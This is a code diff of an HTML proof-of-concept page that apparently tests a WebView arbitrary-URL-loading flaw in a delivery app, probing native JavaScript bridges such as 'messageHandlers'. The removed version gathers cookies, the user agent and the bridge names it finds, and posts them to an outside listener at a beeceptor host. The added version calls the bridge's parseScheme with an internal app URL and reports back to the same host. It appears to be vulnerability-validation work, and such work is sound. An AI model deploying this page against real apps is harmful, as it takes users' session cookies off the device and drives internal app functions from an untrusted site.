@@ -3,72 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebView Validation PoC</title>
+    <title>Vulnerability Validation Proof of Concept</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; background-color: #f4f4f9; color: #333; text-align: center; }
-        .status-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: inline-block; margin-top: 50px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background-color: #f8f9fa; color: #212529; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .alert { padding: 15px; margin-bottom: 20px; border: 1px solid transparent; border-radius: 4px; }
+        .alert-danger { color: #721c24; background-color: #f8d7da; border-color: #f5c6cb; }
+        .alert-success { color: #155724; background-color: #d4edda; border-color: #c3e6cb; }
+        .card { background: #fff; border: 1px solid #dee2e6; padding: 20px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        h2 { margin-top: 0; }
+        code { background: #e9ecef; padding: 2px 4px; border-radius: 4px; font-family: monospace; }
     </style>
 </head>
 <body>
+    <div class="container">
+        <div class="alert alert-danger">
+            <strong>Security Validation Page</strong><br>
+            If you see this page inside the application WebView, an arbitrary URL loading vulnerability exists.
+        </div>
 
-    <div class="status-box">
-        <h2>Verification Page Loaded</h2>
-        <p>Analyzing WebView environment and transmitting findings...</p>
-        <p id="status-text" style="color: #666;">Initializing exfiltration...</p>
+        <div class="card">
+            <h2>JavaScript Interface Verification</h2>
+            <p>Testing communication with the native bridge <code>messageHandlers</code>...</p>
+            <div id="status-box" class="alert alert-danger">Checking interface availability...</div>
+        </div>
     </div>
 
     <script>
-        const BEECEPTOR_ENDPOINT = "https://evilios.free.beeceptor.com";
+        const BEECEPTOR_URL = "https://evilios.free.beeceptor.com";
 
         window.onload = function() {
-            // 1. Gather client-side accessible data
-            const payload = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                cookies: document.cookie || "No document.cookie accessible",
-                interfacesDetected: {
-                    messageHandlers: typeof window.messageHandlers !== 'undefined',
-                    eatsPopupWebViewHandlers: typeof window.eatsPopupWebViewHandlers !== 'undefined',
-                    eatsWebEventHandlers: typeof window.eatsWebEventHandlers !== 'undefined',
-                    eatsWebTrackingHandlers: typeof window.eatsWebTrackingHandlers !== 'undefined',
-                    CoupangAppTracking: typeof window.CoupangAppTracking !== 'undefined'
-                }
-            };
+            const statusBox = document.getElementById('status-box');
 
-            // 2. Transmit gathered data to your Beeceptor listener
-            fetch(BEECEPTOR_ENDPOINT, {
-                method: "POST",
-                mode: "cors",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                document.getElementById('status-text').innerText = "Data sent to Beeceptor successfully.";
-                
-                // 3. Attempt a safe interface trigger to verify execution capabilities
-                triggerInterfaceVerification();
-            })
-            .catch(error => {
-                document.getElementById('status-text').innerText = "Transmission failed: " + error.message;
-            });
-        };
+            // Check if the native app bridge is present in our context
+            if (typeof window.messageHandlers !== 'undefined') {
+                statusBox.className = "alert alert-success";
+                statusBox.innerHTML = "<strong>SUCCESS:</strong> <code>messageHandlers</code> bridge detected inside this untrusted origin.<br>Attempting invocation...";
 
-        function triggerInterfaceVerification() {
-            if (typeof window.messageHandlers !== 'undefined' && typeof window.messageHandlers.deviceStatus === 'function') {
+                // Execute a safe interface call to prove control over internal navigation
+                // This triggers the internal screen parsing logic to demonstrate capabilities
                 try {
-                    // Triggering a safe call to observe execution flow in logcat
-                    window.messageHandlers.deviceStatus("{}");
+                    window.messageHandlers.parseScheme("coupangeats://SomeInternalScreen");
+                    
+                    // Log the successful execution event back to your listener
+                    fetch(`${BEECEPTOR_URL}/js-interface-triggered`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            status: "Verified",
+                            message: "Successfully executed parseScheme from an external domain."
+                        })
+                    });
                 } catch (e) {
-                    // Send error details back to listener if invocation fails
-                    fetch(`${BEECEPTOR_ENDPOINT}/error`, {
+                    // Log execution failure if the method signature differs
+                    fetch(`${BEECEPTOR_URL}/js-interface-error`, {
                         method: "POST",
                         body: JSON.stringify({ error: e.message })
                     });
                 }
+            } else {
+                statusBox.innerHTML = "<strong>FAILED:</strong> <code>messageHandlers</code> is not available. Ensure the target activity handles this URL execution.";
             }
-        }
+        };
     </script>
 </body>
 </html>
